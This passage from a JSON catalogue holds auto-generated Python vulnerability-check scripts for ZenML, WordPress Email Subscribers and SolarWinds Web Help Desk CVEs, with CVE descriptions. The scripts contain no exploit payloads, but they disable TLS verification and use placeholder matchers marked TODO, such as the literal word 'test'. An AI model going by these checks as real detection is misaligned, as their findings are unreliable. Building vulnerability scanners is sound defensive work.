ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-25723\nName: ZenML ZenML Server - Improper Authentication\nSeverity: critical\nDescription: ZenML Server in the ZenML machine learning package before 0.46.7 for Python allows remote privilege escalation because the /api/v1/users/{user_name_or_id}/activate REST API endpoint allows access on the basis of a valid username along with a new password in the request body.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_25723:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-25723\"\n    SEVERITY = \"critical\"\n    NAME = \"ZenML ZenML Server - Improper Authentication\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: compare_versions(version, '< 0.46.7'); !contains_any(version, '0.44.4', '0.43.1', '0.42.2')\"\n\n        # Simple word matcher simulation\n        matchers = ['< 0.46.7', '0.44.4', '0.43.1', '0.42.2']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ZenML ZenML Server - Improper Authentication\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_25723(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2024",
          "passive",
          "auth-bypass",
          "zenml",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_2876",
        "name": "Wordpress Email Subscribers by Icegram Express - SQL Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "The Email Subscribers by Icegram Express - Email Marketing, Newsletters, Automation for WordPress & WooCommerce plugin for WordPress is vulnerable to SQL Injection via the 'run' function of the 'IG_ES_Subscribers_Query' class in all versions up to, and including, 5.7.14 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.",
        "severity": "critical",
        "detection": "[OR] DSL: duration>=4; status_code == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-2876\nName: Wordpress Email Subscribers by Icegram Express - SQL Injection\nSeverity: critical\nDescription: The Email Subscribers by Icegram Express - Email Marketing, Newsletters, Automation for WordPress & WooCommerce plugin for WordPress is vulnerable to SQL Injection via the 'run' function of the 'IG_ES_Subscribers_Query' class in all versions up to, and including, 5.7.14 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_2876:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-2876\"\n    SEVERITY = \"critical\"\n    NAME = \"Wordpress Email Subscribers by Icegram Express - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration>=4; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Wordpress Email Subscribers by Icegram Express - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_2876(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-2876\nName: Wordpress Email Subscribers by Icegram Express - SQL Injection\nSeverity: critical\nDescription: The Email Subscribers by Icegram Express - Email Marketing, Newsletters, Automation for WordPress & WooCommerce plugin for WordPress is vulnerable to SQL Injection via the 'run' function of the 'IG_ES_Subscribers_Query' class in all versions up to, and including, 5.7.14 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_2876:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-2876\"\n    SEVERITY = \"critical\"\n    NAME = \"Wordpress Email Subscribers by Icegram Express - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration>=4; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Wordpress Email Subscribers by Icegram Express - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_2876(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "time-based-sqli",
          "cve",
          "cve2024",
          "wp",
          "wordpress",
          "wp-plugin",
          "sqli",
          "email-subscribers",
          "wpscan",
          "vkev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_28986",
        "name": "SolarWinds Web Help Desk < 12.8.3 - Insecure Deserialization",
        "language": "Python",
        "famille": "CVE",
        "description": "SolarWinds Web Help Desk before version 12.8.3 contain a critical Java deserialization vulnerability that enables remote code execution. Attackers can exploit this flaw to execute arbitrary commands on the host machine. Initially reported as unauthenticated, SolarWinds was unable to reproduce without authentication but still recommended immediate patching. With a CVSS score of 9.8, this vulnerability was discovered by Inmarsat Government researchers and added to CISA's Known Exploited Vulnerabilities Catalog due to active exploitation in the wild. The complete attack vector requires low complexity and has high impact on confidentiality, integrity, and availability. This vulnerability was later bypassed, leading to CVE-2024-28988 and subsequently CVE-2025-26399. Fixed in version 12.8.3 Hotfix 1.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Web Help Desk Software, SolarWinds WorldWide, /WebObjects/Helpdesk.woa' | DSL: compare_versions(version, '< 12.8.3.0')",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-28986\nName: SolarWinds Web Help Desk < 12.8.3 - Insecure Deserialization\nSeverity: critical\nDescription: SolarWinds Web Help Desk before version 12.8.3 contain a critical Java deserialization vulnerability that enables remote code execution. Attackers can exploit this flaw to execute arbitrary commands on the host machine. Initially reported as unauthenticated, SolarWinds was unable to reproduce without authentication but still recommended immediate patching. With a CVSS score of 9.8, this vulnerability was discovered by Inmarsat Government researchers and added to CISA's Known Exploited Vulnerabilities Catalog due to active exploitation in the wild. The complete attack vector requires low complexity and has high impact on confidentiality, integrity, and availability. This vulnerability was later bypassed, leading to CVE-2024-28988 and subsequently CVE-2025-26399. Fixed in version 12.8.3 Hotfix 1.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_28986:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-28986\"\n    SEVERITY = \"critical\"\n    NAME = \"SolarWinds Web Help Desk < 12.8.3 - Insecure Deserialization\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Web Help Desk Software, SolarWinds WorldWide, /WebObjects/Helpdesk.woa' | DSL: compare_versions(version, '< 12.8.3.0')\"\n\n        # Simple word matcher simulation\n        matchers = ['Web Help Desk Software, SolarWinds WorldWide, /WebObjects/Helpdesk.woa', '< 12.8.3.0']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"SolarWinds Web Help Desk < 12.8.3 - Insecure Deserialization\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_28986(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-28986\nName: SolarWinds Web Help Desk < 12.8.3 - Insecure Deserialization\nSeverity: critical\nDescription: SolarWinds Web Help Desk before version 12.8.3 contain a critical Java deserialization vulnerability that enables remote code execution. Attackers can exploit this flaw to execute arbitrary commands on the host machine. Initially reported as unauthenticated, SolarWinds was unable to reproduce without authentication but still recommended immediate patching. With a CVSS score of 9.8, this vulnerability was discovered by Inmarsat Government researchers and added to CISA's Known Exploited Vulnerabilities Catalog due to active exploitation in the wild. The complete attack vector requires low complexity and has high impact on confidentiality, integrity, and availability. This vulnerability was later bypassed, leading to CVE-2024-28988 and subsequently CVE-2025-26399. Fixed in version 12.8.3 Hotfix 1.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_28986:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-28986\"\n    SEVERITY = \"critical\"\n    NAME = \"SolarWinds Web Help Desk < 12.8.3 - Insecure Deserialization\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Web Help Desk Software, SolarWinds WorldWide, /WebObjects/Helpdesk.woa' | DSL: compare_versions(version, '< 12.8.3.0')\"\n\n        # Simple word matcher simulation\n        matchers = ['Web Help Desk Software, SolarWinds WorldWide, /WebObjects/Helpdesk.woa', '< 12.8.3.0']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> 